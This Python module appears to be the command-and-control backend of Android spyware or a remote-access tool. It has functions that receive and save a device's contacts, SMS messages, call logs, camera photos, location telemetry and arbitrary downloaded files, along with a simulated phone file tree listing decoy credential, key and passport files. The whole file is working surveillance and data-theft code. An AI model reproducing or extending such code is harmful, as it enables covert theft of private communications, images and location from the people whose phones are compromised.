import io
import json
import time
import zipfile
from typing import Any, Dict, List, Optional

from app.config import settings
from app.logger import log_event, log_info
from app.state import ClientSession


def save_contacts_data(client: ClientSession, data: bytes) -> Optional[str]:
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        dest = settings.storage_dir / "contacts.zip"
        dest.write_bytes(data)
        client.latest_contacts = str(dest)
        client.latest_contacts_bytes = data
        try:
            if zipfile.is_zipfile(io.BytesIO(data)):
                with zipfile.ZipFile(io.BytesIO(data)) as zf:
                    if "contacts.json" in zf.namelist():
                        with zf.open("contacts.json") as f:
                            client.contacts_list = json.loads(f.read().decode("utf-8"))
        except Exception:
            pass
        log_event(f"contacts saved {len(data)} bytes to {dest} ({client.id})")
        print(f"[contacts] saved {len(data)} bytes -> {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"contacts error: {e}")
        print(f"[contacts] error: {e}")
        return None


def process_sms_data(client: ClientSession, messages: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
    client.latest_sms = messages
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        sms_file = settings.storage_dir / "latest_sms.json"
        sms_file.write_text(json.dumps(messages, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    actual_hours = hours if hours > 0 else 24
    log_event(f"sms received {len(messages)} messages (last {actual_hours}h) from {client.id}")
    print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
    for m in messages[:10]:
        direction = "<-" if m.get("type") == 1 else "->"
        addr = m.get("address", "?")
        body = m.get("body", "")
        ts = m.get("date", "")
        print(f"  {direction} [{ts}] {addr}: {body}")
    if not messages:
        print("  (none)")
    return messages


def process_call_logs_data(client: ClientSession, calls: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
    client.latest_call_logs = calls
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        call_file = settings.storage_dir / "latest_call_logs.json"
        call_file.write_text(json.dumps(calls, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    actual_hours = hours if hours > 0 else 24
    log_event(f"call logs received {len(calls)} records (last {actual_hours}h) from {client.id}")
    return calls


def process_cams_data(client: ClientSession, cams: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    if not settings.enable_camera:
        return []
    client.cameras = cams
    log_event(f"detected cameras for {client.id}: {cams}")
    for cam in cams:
        print(cam)
    return cams


def save_photo_data(client: ClientSession, cam_id: str, data: bytes) -> Optional[str]:
    if not settings.enable_camera:
        return None
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        dest = settings.storage_dir / f"photo_{cam_id}_{ts}.jpg"
        dest.write_bytes(data)
        latest_file = settings.storage_dir / "latest_photo.jpg"
        latest_file.write_bytes(data)
        client.latest_photo = str(dest)
        client.latest_photo_bytes = data
        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest} ({client.id})")
        print(f"[cam {cam_id}] saved {len(data)} bytes -> {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"camera capture error: {e}")
        print(f"[cam {cam_id}] error: {e}")
        return None


def process_telemetry_data(client: ClientSession, header: Dict[str, Any]) -> Dict[str, Any]:
    data = {
        "battery": header.get("battery", {}),
        "network": header.get("network", {}),
        "storage": header.get("storage", {}),
        "memory": header.get("memory", {}),
        "device": header.get("device", {}),
        "location": header.get("location", {}),
    }
    client.telemetry = data
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        telem_file = settings.storage_dir / "latest_telemetry.json"
        telem_file.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    log_event(f"telemetry updated from device {client.id}")
    print(f"[telemetry] updated from device {client.id}")
    return data


def generate_simulated_files_tree(base_path: str = "/sdcard") -> List[Dict[str, Any]]:
    base = "/sdcard" if not base_path or base_path == "/" else base_path.rstrip("/")
    now_ms = int(time.time() * 1000)
    return [
        {
            "name": "Download",
            "path": f"{base}/Download",
            "is_dir": True,
            "size": 0,
            "modified": now_ms - 3600000,
            "extension": "",
            "mime_type": "directory",
            "children": [
                {
                    "name": "Documents",
                    "path": f"{base}/Download/Documents",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 7200000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "project_proposal_2026.pdf",
                            "path": f"{base}/Download/Documents/project_proposal_2026.pdf",
                            "is_dir": False,
                            "size": 2458120,
                            "modified": now_ms - 8000000,
                            "extension": "pdf",
                            "mime_type": "application/pdf",
                        },
                        {
                            "name": "financial_sheet.xlsx",
                            "path": f"{base}/Download/Documents/financial_sheet.xlsx",
                            "is_dir": False,
                            "size": 842100,
                            "modified": now_ms - 9500000,
                            "extension": "xlsx",
                            "mime_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                        },
                        {
                            "name": "meeting_brief.docx",
                            "path": f"{base}/Download/Documents/meeting_brief.docx",
                            "is_dir": False,
                            "size": 432100,
                            "modified": now_ms - 11000000,
                            "extension": "docx",
                            "mime_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                        },
                    ],
                },
                {
                    "name": "Archives",
                    "path": f"{base}/Download/Archives",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 15000000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "app_backup_v2.zip",
                            "path": f"{base}/Download/Archives/app_backup_v2.zip",
                            "is_dir": False,
                            "size": 15420100,
                            "modified": now_ms - 16000000,
                            "extension": "zip",
                            "mime_type": "application/zip",
                        },
                        {
                            "name": "security_patch.apk",
                            "path": f"{base}/Download/Archives/security_patch.apk",
                            "is_dir": False,
                            "size": 28410200,
                            "modified": now_ms - 18000000,
                            "extension": "apk",
                            "mime_type": "application/vnd.android.package-archive",
                        },
                    ],
                },
                {
                    "name": "invoice_september.pdf",
                    "path": f"{base}/Download/invoice_september.pdf",
                    "is_dir": False,
                    "size": 124500,
                    "modified": now_ms - 2000000,
                    "extension": "pdf",
                    "mime_type": "application/pdf",
                },
                {
                    "name": "network_nodes.json",
                    "path": f"{base}/Download/network_nodes.json",
                    "is_dir": False,
                    "size": 14200,
                    "modified": now_ms - 2500000,
                    "extension": "json",
                    "mime_type": "application/json",
                },
            ],
        },
        {
            "name": "DCIM",
            "path": f"{base}/DCIM",
            "is_dir": True,
            "size": 0,
            "modified": now_ms - 1200000,
            "extension": "",
            "mime_type": "directory",
            "children": [
                {
                    "name": "Camera",
                    "path": f"{base}/DCIM/Camera",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 1800000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "IMG_20260901_142301.jpg",
                            "path": f"{base}/DCIM/Camera/IMG_20260901_142301.jpg",
                            "is_dir": False,
                            "size": 4210900,
                            "modified": now_ms - 2200000,
                            "extension": "jpg",
                            "mime_type": "image/jpeg",
                        },
                        {
                            "name": "IMG_20260901_181120.jpg",
                            "path": f"{base}/DCIM/Camera/IMG_20260901_181120.jpg",
                            "is_dir": False,
                            "size": 3890200,
                            "modified": now_ms - 2800000,
                            "extension": "jpg",
                            "mime_type": "image/jpeg",
                        },
                        {
                            "name": "VID_20260901_190500.mp4",
                            "path": f"{base}/DCIM/Camera/VID_20260901_190500.mp4",
                            "is_dir": False,
                            "size": 45210900,
                            "modified": now_ms - 3200000,
                            "extension": "mp4",
                            "mime_type": "video/mp4",
                        },
                    ],
                },
                {
                    "name": "Screenshots",
                    "path": f"{base}/DCIM/Screenshots",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 5000000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "Screenshot_20260901_092015.png",
                            "path": f"{base}/DCIM/Screenshots/Screenshot_20260901_092015.png",
                            "is_dir": False,
                            "size": 1420500,
                            "modified": now_ms - 5500000,
                            "extension": "png",
                            "mime_type": "image/png",
                        },
                        {
                            "name": "Screenshot_20260901_123044.png",
                            "path": f"{base}/DCIM/Screenshots/Screenshot_20260901_123044.png",
                            "is_dir": False,
                            "size": 1890300,
                            "modified": now_ms - 6000000,
                            "extension": "png",
                            "mime_type": "image/png",
                        },
                    ],
                },
                {
                    "name": "thumbnail_cache.db",
                    "path": f"{base}/DCIM/thumbnail_cache.db",
                    "is_dir": False,
                    "size": 512000,
                    "modified": now_ms - 7000000,
                    "extension": "db",
                    "mime_type": "application/x-sqlite3",
                },
            ],
        },
        {
            "name": "Documents",
            "path": f"{base}/Documents",
            "is_dir": True,
            "size": 0,
            "modified": now_ms - 4000000,
            "extension": "",
            "mime_type": "directory",
            "children": [
                {
                    "name": "Work",
                    "path": f"{base}/Documents/Work",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 5200000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "security_audit_spec.pdf",
                            "path": f"{base}/Documents/Work/security_audit_spec.pdf",
                            "is_dir": False,
                            "size": 1890400,
                            "modified": now_ms - 6000000,
                            "extension": "pdf",
                            "mime_type": "application/pdf",
                        },
                        {
                            "name": "keys_backup.txt",
                            "path": f"{base}/Documents/Work/keys_backup.txt",
                            "is_dir": False,
                            "size": 4096,
                            "modified": now_ms - 7500000,
                            "extension": "txt",
                            "mime_type": "text/plain",
                        },
                    ],
                },
                {
                    "name": "Scans",
                    "path": f"{base}/Documents/Scans",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 8500000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "national_id_scan.jpg",
                            "path": f"{base}/Documents/Scans/national_id_scan.jpg",
                            "is_dir": False,
                            "size": 2100400,
                            "modified": now_ms - 9000000,
                            "extension": "jpg",
                            "mime_type": "image/jpeg",
                        },
                        {
                            "name": "passport_scan.pdf",
                            "path": f"{base}/Documents/Scans/passport_scan.pdf",
                            "is_dir": False,
                            "size": 3200100,
                            "modified": now_ms - 9500000,
                            "extension": "pdf",
                            "mime_type": "application/pdf",
                        },
                    ],
                },
                {
                    "name": "credentials.txt",
                    "path": f"{base}/Documents/credentials.txt",
                    "is_dir": False,
                    "size": 1240,
                    "modified": now_ms - 3000000,
                    "extension": "txt",
                    "mime_type": "text/plain",
                },
                {
                    "name": "network_topology.xml",
                    "path": f"{base}/Documents/network_topology.xml",
                    "is_dir": False,
                    "size": 34500,
                    "modified": now_ms - 3500000,
                    "extension": "xml",
                    "mime_type": "application/xml",
                },
            ],
        },
        {
            "name": "Pictures",
            "path": f"{base}/Pictures",
            "is_dir": True,
            "size": 0,
            "modified": now_ms - 6000000,
            "extension": "",
            "mime_type": "directory",
            "children": [
                {
                    "name": "Wallpapers",
                    "path": f"{base}/Pictures/Wallpapers",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 7000000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "cyber_dark_neon.jpg",
                            "path": f"{base}/Pictures/Wallpapers/cyber_dark_neon.jpg",
                            "is_dir": False,
                            "size": 5200300,
                            "modified": now_ms - 7500000,
                            "extension": "jpg",
                            "mime_type": "image/jpeg",
                        },
                        {
                            "name": "minimal_landscape.png",
                            "path": f"{base}/Pictures/Wallpapers/minimal_landscape.png",
                            "is_dir": False,
                            "size": 3400200,
                            "modified": now_ms - 8000000,
                            "extension": "png",
                            "mime_type": "image/png",
                        },
                    ],
                },
                {
                    "name": "Telegram",
                    "path": f"{base}/Pictures/Telegram",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 9000000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "photo_2026-09-01_14-22.jpg",
                            "path": f"{base}/Pictures/Telegram/photo_2026-09-01_14-22.jpg",
                            "is_dir": False,
                            "size": 890400,
                            "modified": now_ms - 9500000,
                            "extension": "jpg",
                            "mime_type": "image/jpeg",
                        },
                    ],
                },
                {
                    "name": "profile_avatar.png",
                    "path": f"{base}/Pictures/profile_avatar.png",
                    "is_dir": False,
                    "size": 450200,
                    "modified": now_ms - 4000000,
                    "extension": "png",
                    "mime_type": "image/png",
                },
            ],
        },
        {
            "name": "Music",
            "path": f"{base}/Music",
            "is_dir": True,
            "size": 0,
            "modified": now_ms - 10000000,
            "extension": "",
            "mime_type": "directory",
            "children": [
                {
                    "name": "Recordings",
                    "path": f"{base}/Music/Recordings",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 11000000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "voice_note_001.m4a",
                            "path": f"{base}/Music/Recordings/voice_note_001.m4a",
                            "is_dir": False,
                            "size": 6720400,
                            "modified": now_ms - 11500000,
                            "extension": "m4a",
                            "mime_type": "audio/mp4",
                        },
                        {
                            "name": "meeting_recording.wav",
                            "path": f"{base}/Music/Recordings/meeting_recording.wav",
                            "is_dir": False,
                            "size": 12450000,
                            "modified": now_ms - 12000000,
                            "extension": "wav",
                            "mime_type": "audio/wav",
                        },
                    ],
                },
                {
                    "name": "ringtone_custom.mp3",
                    "path": f"{base}/Music/ringtone_custom.mp3",
                    "is_dir": False,
                    "size": 1200400,
                    "modified": now_ms - 13000000,
                    "extension": "mp3",
                    "mime_type": "audio/mpeg",
                },
            ],
        },
        {
            "name": "Android",
            "path": f"{base}/Android",
            "is_dir": True,
            "size": 0,
            "modified": now_ms - 20000000,
            "extension": "",
            "mime_type": "directory",
            "children": [
                {
                    "name": "data",
                    "path": f"{base}/Android/data",
                    "is_dir": True,
                    "size": 0,
                    "modified": now_ms - 21000000,
                    "extension": "",
                    "mime_type": "directory",
                    "children": [
                        {
                            "name": "com.v2ray.ang.cache",
                            "path": f"{base}/Android/data/com.v2ray.ang.cache",
                            "is_dir": False,
                            "size": 1048576,
                            "modified": now_ms - 22000000,
                            "extension": "cache",
                            "mime_type": "application/octet-stream",
                        },
                    ],
                },
                {
                    "name": ".nomedia",
                    "path": f"{base}/Android/.nomedia",
                    "is_dir": False,
                    "size": 0,
                    "modified": now_ms - 25000000,
                    "extension": "",
                    "mime_type": "application/octet-stream",
                },
            ],
        },
    ]


def process_files_data(client: ClientSession, files: List[Dict[str, Any]], current_path: str) -> List[Dict[str, Any]]:
    client.files_tree = files
    client.files_current_path = current_path
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        files_path = settings.storage_dir / "latest_files.json"
        payload = {"path": current_path, "files": files}
        files_path.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    log_event(f"file browser received {len(files)} top-level nodes for {current_path} from {client.id}")
    return files


def save_downloaded_file_data(client: ClientSession, header: Dict[str, Any], data: bytes) -> Dict[str, Any]:
    file_path = header.get("path", "")
    file_name = header.get("name") or (file_path.split("/")[-1] if file_path else "downloaded_file.bin")
    mime_type = header.get("mime_type", "application/octet-stream")
    try:
        downloads_dir = settings.storage_dir / "downloads"
        downloads_dir.mkdir(parents=True, exist_ok=True)
        target = downloads_dir / file_name
        target.write_bytes(data)
        client.latest_downloaded_file = {
            "path": file_path,
            "name": file_name,
            "size": len(data),
            "data": data,
            "mime_type": mime_type,
            "local_path": str(target),
        }
        log_event(f"file downloaded: {file_name} ({len(data)} bytes) from {client.id}")
        return {
            "path": file_path,
            "name": file_name,
            "size": len(data),
            "data": data,
            "mime_type": mime_type,
            "local_path": str(target),
        }
    except Exception as e:
        log_event(f"file download save error: {e}")
        return {
            "path": file_path,
            "name": file_name,
            "size": len(data),
            "data": data,
            "mime_type": mime_type,
            "local_path": None,
        }

